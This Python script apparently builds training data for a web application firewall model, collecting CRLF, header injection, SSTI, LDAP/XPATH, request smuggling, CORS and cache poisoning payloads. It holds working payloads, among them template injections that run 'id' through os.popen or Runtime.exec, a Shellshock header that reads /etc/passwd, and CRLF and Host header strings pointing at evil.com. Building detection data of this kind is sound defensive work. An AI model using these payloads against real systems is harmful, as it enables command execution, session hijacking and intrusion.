#!/usr/bin/env python3
"""
Harvest header injection, CRLF, SSTI, and LDAP/XPATH payloads from
PayloadsAllTheThings and attack test files, then output them as
training-data dicts for missed_malicious_samples.json and malicious_pool.json.

Output format matches stress_test_1000_evasive.py pool entries:
  {"method": "GET"|"POST", "url": "/path", "params": {...}, "headers": {...}, "json": {...}}

Usage:
    python scripts/harvest_training_payloads.py
"""
import json
import re
import sys
import importlib.util
from pathlib import Path
from typing import List, Dict, Any

SCRIPT_DIR = Path(__file__).parent
PROJECT_ROOT = SCRIPT_DIR.parent
PAT_DIR = PROJECT_ROOT / "PayloadsAllTheThings"

# Add project root to path for imports
sys.path.insert(0, str(PROJECT_ROOT))


def _load_module_from_file(name: str, filepath: Path):
    """Dynamically load a Python module from a file path."""
    spec = importlib.util.spec_from_file_location(name, str(filepath))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ---------------------------------------------------------------------------
# CRLF Injection payloads from PayloadsAllTheThings
# ---------------------------------------------------------------------------

def harvest_crlf_payloads() -> List[Dict[str, Any]]:
    """Read CRLF payloads and generate training variants."""
    results = []
    crlf_file = PAT_DIR / "CRLF Injection" / "Files" / "crlfinjection.txt"
    if not crlf_file.exists():
        print(f"  WARNING: {crlf_file} not found, skipping CRLF file payloads")
        return results

    lines = crlf_file.read_text().strip().splitlines()
    for line in lines:
        line = line.strip()
        if not line:
            continue
        # Variant 1: payload as URL path
        results.append({"method": "GET", "url": line, "params": {}})
        # Variant 2: in redirect_uri param
        results.append({"method": "GET", "url": "/api/redirect", "params": {"url": f"http://example.com{line}"}})
        # Variant 3: in a query param
        results.append({"method": "GET", "url": "/api/page", "params": {"next": line}})

    # Additional hand-crafted CRLF variants not in the file
    extra_crlf = [
        "%0d%0aSet-Cookie:%20admin=true",
        "%0d%0aLocation:%20http://evil.com",
        "%0d%0a%0d%0a<html><body>Injected</body></html>",
        "%0d%0aX-Injected:%20true",
        "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
        "/%0d%0aHost:%20evil.com",
        "%E5%98%8A%E5%98%8DSet-Cookie:%20crlf=injection",
        "%c4%8d%c4%8aSet-Cookie:%20crlf=injection",
        "\r\nSet-Cookie: admin=true",
        "\r\nX-Forwarded-Host: evil.com",
        "\r\n\r\n<script>alert(document.domain)</script>",
        "%0aSet-Cookie:%20session=hijacked",
        "%0dSet-Cookie:%20stolen=true",
        "%00%0d%0aSet-Cookie:%20null=bypass",
        "%%0d0d%%0a0aSet-Cookie:%20double=encode",
    ]
    paths = ["/api/redirect", "/api/login", "/api/goto", "/api/callback", "/api/return"]
    for i, payload in enumerate(extra_crlf):
        path = paths[i % len(paths)]
        results.append({"method": "GET", "url": path, "params": {"url": payload}})
        results.append({"method": "GET", "url": path, "params": {"next": payload}})

    return results


# ---------------------------------------------------------------------------
# Header Injection payloads from attack test 07
# ---------------------------------------------------------------------------

def harvest_header_injection_from_test() -> List[Dict[str, Any]]:
    """Convert 07_header_injection.py attacks to training format."""
    results = []
    test_file = SCRIPT_DIR / "attack_tests" / "07_header_injection.py"
    if not test_file.exists():
        print(f"  WARNING: {test_file} not found")
        return results

    mod = _load_module_from_file("header_test", test_file)
    attacks = getattr(mod, "HEADER_INJECTION_ATTACKS", [])

    for attack in attacks:
        entry = {
            "method": "POST" if "body" in attack else "GET",
            "url": attack["path"],
        }
        if attack.get("query"):
            entry["params"] = attack["query"]
        if attack.get("body"):
            entry["json"] = attack["body"]
        if attack.get("headers"):
            entry["headers"] = attack["headers"]
        results.append(entry)

    return results


# ---------------------------------------------------------------------------
# SSTI payloads from PayloadsAllTheThings + test payloads
# ---------------------------------------------------------------------------

def harvest_ssti_payloads() -> List[Dict[str, Any]]:
    """Extract SSTI payloads from markdown files and test payload definitions."""
    results = []
    ssti_raw = set()

    # 1. From PayloadsAllTheThings markdown files
    ssti_dir = PAT_DIR / "Server Side Template Injection"
    if ssti_dir.exists():
        code_block_re = re.compile(r"```[a-z]*\n(.*?)```", re.DOTALL)
        inline_code_re = re.compile(r"`([^`]{5,120})`")
        template_markers = {"{{", "${", "#{", "<%", "{%", "{#", "[[", "$F{"}

        for md_file in ssti_dir.glob("*.md"):
            if md_file.name == "README.md":
                continue
            content = md_file.read_text(errors="ignore")

            # Extract from code blocks
            for match in code_block_re.finditer(content):
                block = match.group(1).strip()
                for line in block.splitlines():
                    line = line.strip()
                    if (
                        line
                        and 5 < len(line) < 300
                        and not line.startswith("#")
                        and not line.startswith("//")
                        and not line.startswith("---")
                    ):
                        ssti_raw.add(line)

            # Extract inline code with template syntax
            for match in inline_code_re.finditer(content):
                payload = match.group(1).strip()
                if any(m in payload for m in template_markers):
                    ssti_raw.add(payload)

    # 2. From tests/payloads/malicious_payloads.py
    try:
        from tests.payloads.malicious_payloads import (
            TEMPLATE_INJECTION_PAYLOADS,
            LDAP_INJECTION_PAYLOADS,
        )
        for p in TEMPLATE_INJECTION_PAYLOADS:
            ssti_raw.add(p)
    except ImportError:
        print("  WARNING: Could not import TEMPLATE_INJECTION_PAYLOADS")

    # 3. Hand-crafted SSTI payloads for coverage
    handcrafted_ssti = [
        "{{7*7}}",
        "{{config}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{% import os %}{{ os.popen('id').read() }}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__bases__[0].__subclasses__()}}",
        "${__import__('os').system('id')}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    ]
    for p in handcrafted_ssti:
        ssti_raw.add(p)

    # Convert to training format
    api_paths = ["/api/template", "/api/render", "/api/search", "/api/format", "/api/page",
                 "/api/preview", "/api/eval", "/api/display"]
    param_names = ["input", "template", "name", "query", "content", "text", "expr", "value"]

    for i, payload in enumerate(ssti_raw):
        path = api_paths[i % len(api_paths)]
        param = param_names[i % len(param_names)]
        # Variant 1: in query param
        results.append({"method": "GET", "url": path, "params": {param: payload}})
        # Variant 2: in POST body
        results.append({"method": "POST", "url": path, "json": {param: payload}})

    return results


# ---------------------------------------------------------------------------
# LDAP / XPATH payloads from attack test 08
# ---------------------------------------------------------------------------

def harvest_ldap_xpath_from_test() -> List[Dict[str, Any]]:
    """Convert 08_ldap_xpath_injection.py attacks to training format."""
    results = []
    test_file = SCRIPT_DIR / "attack_tests" / "08_ldap_xpath_injection.py"
    if not test_file.exists():
        print(f"  WARNING: {test_file} not found")
        return results

    mod = _load_module_from_file("ldap_test", test_file)
    attacks = getattr(mod, "INJECTION_ATTACKS", [])

    for attack in attacks:
        entry = {
            "method": "POST" if "body" in attack else "GET",
            "url": attack["path"],
        }
        if attack.get("query"):
            entry["params"] = attack["query"]
        if attack.get("body"):
            body = attack["body"]
            entry["json"] = body if isinstance(body, dict) else {"data": body}
        if attack.get("headers"):
            entry["headers"] = attack["headers"]
        results.append(entry)

    # Extra LDAP payloads from tests/payloads
    try:
        from tests.payloads.malicious_payloads import LDAP_INJECTION_PAYLOADS
        for p in LDAP_INJECTION_PAYLOADS:
            results.append({"method": "GET", "url": "/api/search", "params": {"filter": p}})
            results.append({"method": "POST", "url": "/api/ldap/query", "json": {"filter": p}})
    except ImportError:
        pass

    return results


# ---------------------------------------------------------------------------
# Additional header-based attack patterns (hand-crafted)
# ---------------------------------------------------------------------------

def harvest_extra_header_attacks() -> List[Dict[str, Any]]:
    """Generate additional header-based attack patterns for training diversity."""
    results = []

    # HTTP Request Smuggling variations
    smuggling = [
        {"method": "POST", "url": "/api/data", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "0"}},
        {"method": "POST", "url": "/api/submit", "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": "cow"}},
        {"method": "POST", "url": "/api/upload", "headers": {"Transfer-Encoding": " chunked"}},
        {"method": "POST", "url": "/api/form", "headers": {"Transfer-Encoding": "chunked", "Transfer-Encoding": "identity"}},
        {"method": "POST", "url": "/api/process", "headers": {"Content-Length": "4", "Transfer-Encoding": "chunked"}, "json": {"a": "b"}},
    ]
    results.extend(smuggling)

    # Host header attacks
    host_attacks = [
        {"method": "GET", "url": "/api/reset-password", "headers": {"Host": "evil.com"}},
        {"method": "GET", "url": "/api/verify-email", "headers": {"Host": "attacker.com", "X-Forwarded-Host": "evil.com"}},
        {"method": "GET", "url": "/api/confirm", "headers": {"X-Forwarded-Host": "evil.com:8080"}},
        {"method": "GET", "url": "/api/redirect", "headers": {"X-Original-URL": "/admin/delete-user"}},
        {"method": "GET", "url": "/api/page", "headers": {"X-Rewrite-URL": "/admin/settings"}},
    ]
    results.extend(host_attacks)

    # Header injection in User-Agent / Referer
    ua_attacks = [
        {"method": "GET", "url": "/api/home", "headers": {"User-Agent": "Mozilla/5.0\r\nX-Injected: true"}},
        {"method": "GET", "url": "/api/home", "headers": {"User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"}},
        {"method": "GET", "url": "/api/home", "headers": {"Referer": "http://evil.com\r\nSet-Cookie: admin=true"}},
        {"method": "GET", "url": "/api/page", "headers": {"Referer": "<script>alert(1)</script>"}},
        {"method": "GET", "url": "/api/data", "headers": {"User-Agent": "<!--#exec cmd=\"id\"-->"}},
    ]
    results.extend(ua_attacks)

    # CORS abuse
    cors_attacks = [
        {"method": "GET", "url": "/api/sensitive", "headers": {"Origin": "https://evil.com"}},
        {"method": "GET", "url": "/api/data", "headers": {"Origin": "null"}},
        {"method": "OPTIONS", "url": "/api/admin", "headers": {"Origin": "https://attacker.com", "Access-Control-Request-Method": "DELETE"}},
    ]
    results.extend(cors_attacks)

    # Method override attacks
    override_attacks = [
        {"method": "POST", "url": "/api/resource/1", "headers": {"X-HTTP-Method-Override": "DELETE"}},
        {"method": "POST", "url": "/api/users/1", "headers": {"X-HTTP-Method-Override": "PUT"}, "json": {"role": "admin"}},
        {"method": "GET", "url": "/api/debug", "headers": {"X-HTTP-Method-Override": "TRACE"}},
    ]
    results.extend(override_attacks)

    # Cache poisoning
    cache_attacks = [
        {"method": "GET", "url": "/static/app.js", "headers": {"X-Forwarded-Host": "evil.com"}},
        {"method": "GET", "url": "/api/resource", "headers": {"X-Forwarded-Scheme": "nothttps"}},
        {"method": "GET", "url": "/api/page", "headers": {"X-Forwarded-Proto": "http", "X-Forwarded-Port": "443"}},
    ]
    results.extend(cache_attacks)

    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def harvest_categorized_data() -> List[Dict[str, Any]]:
    """Load payloads from data/malicious/ categorized JSON files."""
    results = []
    data_dir = PROJECT_ROOT / "data" / "malicious"
    if not data_dir.exists():
        print("  WARNING: data/malicious/ not found — run populate_malicious_data.py first")
        return results

    for json_file in sorted(data_dir.glob("*.json")):
        try:
            entries = json.loads(json_file.read_text())
            results.extend(entries)
            print(f"    {json_file.name}: {len(entries)} entries")
        except (json.JSONDecodeError, IOError) as e:
            print(f"    WARNING: Could not read {json_file.name}: {e}")

    return results


def main():
    print("=" * 60)
    print("PAYLOAD HARVESTER — Training Data Generation")
    print("=" * 60)

    all_payloads = []

    print("\n[1/6] Harvesting CRLF payloads from PayloadsAllTheThings...")
    crlf = harvest_crlf_payloads()
    print(f"  -> {len(crlf)} CRLF training samples")
    all_payloads.extend(crlf)

    print("[2/6] Harvesting header injection payloads from attack test 07...")
    header = harvest_header_injection_from_test()
    print(f"  -> {len(header)} header injection training samples")
    all_payloads.extend(header)

    print("[3/6] Harvesting extra header-based attack patterns...")
    extra_header = harvest_extra_header_attacks()
    print(f"  -> {len(extra_header)} extra header attack samples")
    all_payloads.extend(extra_header)

    print("[4/6] Harvesting SSTI payloads from PayloadsAllTheThings + test files...")
    ssti = harvest_ssti_payloads()
    print(f"  -> {len(ssti)} SSTI training samples")
    all_payloads.extend(ssti)

    print("[5/6] Harvesting LDAP/XPATH payloads from attack test 08...")
    ldap = harvest_ldap_xpath_from_test()
    print(f"  -> {len(ldap)} LDAP/XPATH training samples")
    all_payloads.extend(ldap)

    print("[6/6] Loading categorized payloads from data/malicious/...")
    categorized = harvest_categorized_data()
    print(f"  -> {len(categorized)} categorized training samples")
    all_payloads.extend(categorized)

    # Deduplicate by serializing to JSON
    seen = set()
    unique_payloads = []
    for p in all_payloads:
        key = json.dumps(p, sort_keys=True)
        if key not in seen:
            seen.add(key)
            unique_payloads.append(p)

    print(f"\nTotal harvested: {len(all_payloads)} -> {len(unique_payloads)} unique malicious training samples")

    # Write to missed_malicious_samples.json (3x weight in training)
    missed_path = SCRIPT_DIR / "missed_malicious_samples.json"
    with open(missed_path, "w") as f:
        json.dump(unique_payloads, f, indent=2, ensure_ascii=False)
    print(f"\nWrote {len(unique_payloads)} entries to {missed_path.name}")

    # Append to malicious_pool.json for 1x weight coverage
    pool_path = SCRIPT_DIR / "data" / "malicious_pool.json"
    if pool_path.exists():
        existing_pool = json.loads(pool_path.read_text())
        print(f"  Existing malicious_pool.json has {len(existing_pool)} entries")
    else:
        existing_pool = []

    combined = existing_pool + unique_payloads
    with open(pool_path, "w") as f:
        json.dump(combined, f, indent=2, ensure_ascii=False)
    print(f"  Appended to malicious_pool.json (total: {len(combined)} entries)")

    print("\n" + "=" * 60)
    print("DONE — Ready for retraining:")
    print("  python scripts/finetune_waf_model.py --augment --epochs 5")
    print("=" * 60)


if __name__ == "__main__":
    main()
